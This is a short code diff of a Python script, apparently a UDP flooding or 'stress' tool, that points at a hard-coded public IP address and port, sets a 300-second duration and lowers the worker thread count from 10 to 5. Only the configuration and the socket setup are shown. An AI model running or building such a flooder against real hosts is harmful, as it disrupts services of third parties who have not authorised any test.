@@ -6,7 +6,7 @@ import threading
 TARGET_IP = "94.23.168.153"
 TARGET_PORT = 2343
 DURATION = 300  # مدة الاختبار بالثواني
-THREADS = 10
+THREADS = 5
 
 def smart_stress_worker(end_time):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
